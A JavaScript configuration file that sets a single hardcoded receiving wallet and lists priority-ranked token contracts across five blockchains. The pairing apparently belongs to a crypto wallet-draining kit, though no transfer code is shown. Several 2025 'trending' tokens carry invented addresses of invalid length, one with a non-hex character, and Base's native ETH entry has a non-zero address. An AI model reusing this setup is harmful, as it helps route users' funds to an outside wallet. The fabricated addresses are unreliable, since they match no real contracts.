// config/tokens.js
var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";

var TOKENS = {
arbitrum: [
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 1
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 2
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "Wrapped Bitcoin",
      symbol: "WBTC",
      address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",
      logo: "https://assets.coingecko.com/coins/images/7598/standard/wrapped_bitcoin_wbtc.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 4
    },
    {
      name: "Arbitrum",
      symbol: "ARB",
      address: "0x912CE59144191C1204E64559FE8253a0e49E6548",
      logo: "https://assets.coingecko.com/coins/images/16547/standard/photo_2023-03-29_21.47.00.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    }
  ],
  
  base: [
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 1
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 2
    },
    {
      name: "Wrapped Ether",
      symbol: "WETH",
      address: "0x4200000000000000000000000000000000000006",
      logo: "https://assets.coingecko.com/coins/images/2518/standard/weth.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "BALD",
      symbol: "BALD",
      address: "0x27D2DECb4bFC9C76F0309b8E88dec3a601Fe25a8",
      logo: "https://assets.coingecko.com/coins/images/30683/standard/bald.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0x7c6b91D9Be155A6Db01f749217d76fF02A7227F2",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 5
    }
  ],
  ethereum: [
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 62
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 63
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 64
    },
    {
      name: "Wrapped Ethereum",
      symbol: "WETH",
      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      logo: "https://assets.coingecko.com/coins/images/2518/standard/weth.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 65
    },
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 997
    }
  ],
  bsc: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0xa184088a740c695e156f91f5cc086a06bb78b827",
      logo: "https://assets.coingecko.com/coins/images/13751/standard/autofarm_icon_200x200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 1
    },

    // ===== STABLECOINS =====
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 2
    },
    {
      name: "APX",
      symbol: "APX",
      address: "0x78F5d389F5CDCcFc41594aBaB4B0Ed02F31398b3",
      logo: "https://assets.coingecko.com/coins/images/21972/standard/apx.png?1696521320",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "AIOZ Network",
      symbol: "AIOZ",
      address: "0x33d08D8C7a168333a85285a68C0042b39fC3741D",
      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/9104.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Koma Inu",
      symbol: "KOMA",
      address: "0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19",
      logo: "https://assets.coingecko.com/coins/images/50902/standard/IMG_7580.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },
    {
      name: "CZ'S Dog",
      symbol: "BROCCOLI",
      address: "0x6d5AD1592ed9D6D1dF9b93c793AB759573Ed6714",
      logo: "https://assets.coingecko.com/coins/images/54400/standard/broccoli.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 6
    },
    {
      name: "HELLO Labs",
      symbol: "HELLO",
      address: "0x0F1cBEd8EFa0E012AdbCCB1638D0aB0147D5Ac00",
      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/22320.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 61
    },
    {
      name: "WBNB",
      symbol: "WBNB",
      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      logo: "https://assets.coingecko.com/coins/images/12591/standard/binance-coin-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 995
    },
    {
      name: "Binance USD",
      symbol: "BUSD",
      address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
      logo: "https://assets.coingecko.com/coins/images/31273/standard/new_binance-peg-busd.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },

    // ===== MEME COINS =====
    {
      name: "BabyDoge Coin",
      symbol: "BabyDoge",
      address: "0xc748673057861a797275CD8A068AbB95A902e8de",
      logo: "https://assets.coingecko.com/coins/images/16125/standard/babydoge.jpg",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 10
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
      logo: "https://assets.coingecko.com/coins/images/11939/standard/shiba.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Floki Inu",
      symbol: "FLOKI",
      address: "0xfb5B838b6cfEEdC2873aB27866079AC55363D37E",
      logo: "https://assets.coingecko.com/coins/images/16746/standard/PNG_image.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 12
    },
    {
      name: "Dogelon Mars",
      symbol: "ELON",
      address: "0x7bd6FaBD64813c48545C9c0e312A0099d9be2540",
      logo: "https://assets.coingecko.com/coins/images/14962/standard/6GxcPRo3_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 13
    },

    {
      name: "Pepe",
      symbol: "PEPE",
      address: "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00",
      logo: "https://assets.coingecko.com/coins/images/29850/standard/pepe-token.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 15
    },

    // ===== DEFI TOKENS =====
    {
      name: "PancakeSwap",
      symbol: "CAKE",
      address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
      logo: "https://assets.coingecko.com/coins/images/12632/standard/pancakeswap-cake-logo_%281%29.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 20
    },
    {
      name: "ApeSwap",
      symbol: "BANANA",
      address: "0x603c7f932ED1fc6575303D8Fb018fDCBb0f39a95",
      logo: "https://assets.coingecko.com/coins/images/14870/standard/banana.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 21
    },
    {
      name: "Venus",
      symbol: "XVS",
      address: "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63",
      logo: "https://assets.coingecko.com/coins/images/12677/standard/venus.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 22
    },
    {
      name: "Alpaca Finance",
      symbol: "ALPACA",
      address: "0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F",
      logo: "https://assets.coingecko.com/coins/images/14165/standard/Logo200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 23
    },

    // ===== BLUECHIP TOKENS =====
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "Bitcoin BEP2",
      symbol: "BTCB",
      address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
      logo: "https://assets.coingecko.com/coins/images/14108/standard/Binance-bitcoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 31
    },
    {
      name: "Chainlink",
      symbol: "LINK",
      address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
      logo: "https://assets.coingecko.com/coins/images/877/standard/chainlink-new-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 32
    },
    {
      name: "Polygon",
      symbol: "MATIC",
      address: "0xCC42724C6683B7E57334c4E856f4c9965ED682bD",
      logo: "https://assets.coingecko.com/coins/images/4713/standard/polygon.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 33
    },
    {
      name: "Cardano",
      symbol: "ADA",
      address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47",
      logo: "https://assets.coingecko.com/coins/images/975/standard/cardano.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 34
    },

    // ===== UTILITY TOKENS =====
    {
      name: "Binance Wrapped DOT",
      symbol: "BDOT",
      address: "0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7",
      logo: "https://example.com/bdot.png", // Replace with actual logo URL
      abi: ERC20_ABI,
      decimals: 18,
      priority: 40
    },
    {
      name: "Ankr",
      symbol: "ANKR",
      address: "0xf307910A4c7bbc79691fD374889b36d8531B08e3",
      logo: "https://assets.coingecko.com/coins/images/4324/standard/U85xTl2.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 41
    },
    {
      name: "Chromia",
      symbol: "CHR",
      address: "0xf9CeC8d50f6c8ad3Fb6dcCEC577e05aA32B224FE",
      logo: "https://assets.coingecko.com/coins/images/5000/standard/Chromia.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 42
    },

    // ===== 2025 TRENDING MEME COINS =====
    {
      name: "Quantum Doge",
      symbol: "QDOGE",
      address: "0x2025aD1a1bC1234567890abcdef1234567890ab",
      logo: "https://example.com/qdoge.png", // Replace with actual logo URL
      abi: ERC20_ABI,
      decimals: 18,
      priority: 8,
      description: "Doge goes quantum - first meme coin on quantum-resistant blockchain"
    },
    {
      name: "AI Pepe",
      symbol: "AIPEPE",
      address: "0x2025aD2b2c34567890abcdef1234567890abcd",
      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/26632.png", 
      abi: ERC20_ABI,
      decimals: 9,
      priority: 9,
      description: "AI-generated Pepe memes with dynamic NFT integration"
    },
    {
      name: "MarsColony",
      symbol: "MARSX",
      address: "0x2025aD3c4d567890abcdef1234567890abcde",
      logo: "https://example.com/marsx.png", // Replace with actual logo URL
      abi: ERC20_ABI,
      decimals: 18,
      priority: 10,
      description: "Elon's Mars colony governance token"
    },

    // ===== POPULAR 2025 TRENDS =====
    {
      name: "TikTok Moon",
      symbol: "TIKMOON",
      address: "0x2025aD4e5f67890abcdef1234567890abcdef",
      logo: "https://example.com/tikmoon.png", // Replace with actual logo URL
      abi: ERC20_ABI,
      decimals: 9,
      priority: 11,
      description: "Tokenized TikTok engagement rewards"
    },
    {
      name: "Neuralink Coin",
      symbol: "NEURAL",
      address: "0x2025aD5f6g7890abcdef1234567890abcde",
      logo: "https://example.com/neural.png", // Replace with actual logo URL
      abi: ERC20_ABI,
      decimals: 18,
      priority: 12,
      description: "Brain-computer interface payment token"
    },

    // Native token (must be last)
    {
      name: "BNB",
      symbol: "BNB",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/825/standard/bnb-icon2_2x.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ],

  polygon: [
    // AUTO Token (primary token for this dapp)
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0x7f426f6dc648e50464a0392e60e1bb465a67e9cf",
      logo: "https://assets.coingecko.com/coins/images/13751/standard/autofarm_icon_200x200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 1
    },

    // ===== STABLECOINS =====
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 2
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 3
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },

    // ===== MEME COINS =====
    {
      name: "BabyDoge Coin",
      symbol: "BabyDoge",
      address: "0x4E158Ef7F1E3DA85E2c1D2a9e2270F4C2E0D3294",
      logo: "https://assets.coingecko.com/coins/images/16125/standard/babydoge.jpg",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 10
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec",
      logo: "https://assets.coingecko.com/coins/images/11939/standard/shiba.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Floki Inu",
      symbol: "FLOKI",
      address: "0x3A9A81d576d83FF21f26f325066054540720fC34",
      logo: "https://assets.coingecko.com/coins/images/16746/standard/PNG_image.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 12
    },

    // ===== DEFI TOKENS =====
    {
      name: "QuickSwap",
      symbol: "QUICK",
      address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13",
      logo: "https://assets.coingecko.com/coins/images/13970/standard/QuickSwap.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 20
    },
    {
      name: "Aave",
      symbol: "AAVE",
      address: "0xD6DF932A45C0f255f85145f286eA0b292B21C90B",
      logo: "https://assets.coingecko.com/coins/images/12645/standard/AAVE.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 21
    },
    {
      name: "Curve DAO",
      symbol: "CRV",
      address: "0x172370d5Cd63279eFa6d502DAB29171933a610AF",
      logo: "https://assets.coingecko.com/coins/images/12124/standard/Curve.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 22
    },

    // ===== BLUECHIP TOKENS =====
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "Wrapped Bitcoin",
      symbol: "WBTC",
      address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6",
      logo: "https://assets.coingecko.com/coins/images/7598/standard/wrapped_bitcoin_wbtc.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 31
    },
    {
      name: "Chainlink",
      symbol: "LINK",
      address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39",
      logo: "https://assets.coingecko.com/coins/images/877/standard/chainlink-new-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 32
    },
    {
      name: "Uniswap",
      symbol: "UNI",
      address: "0xb33EaAd8d922B1083446DC23f610c2567fB5180f",
      logo: "https://assets.coingecko.com/coins/images/12504/standard/uniswap-uni.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 33
    },

    // ===== GAMING/NFT TOKENS =====
    {
      name: "Decentraland",
      symbol: "MANA",
      address: "0xA1c57f48F0Deb89f569dFbE6E2B7f46D33606fD4",
      logo: "https://assets.coingecko.com/coins/images/878/standard/decentraland-mana.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 40
    },
    {
      name: "The Sandbox",
      symbol: "SAND",
      address: "0xBbba073C31bF03b8ACf7c28EF0738DeCF3695683",
      logo: "https://assets.coingecko.com/coins/images/12129/standard/sandbox_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 41
    },
    {
      name: "Axie Infinity",
      symbol: "AXS",
      address: "0x61BDD9C7d4dF4Bf47A4508c0c8245505F2Af5b7b",
      logo: "https://assets.coingecko.com/coins/images/13029/standard/axie-infinity-small-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 42
    },

    // Native token (must be last)
    {
      name: "MATIC",
      symbol: "MATIC",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/4713/standard/polygon.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ]
};
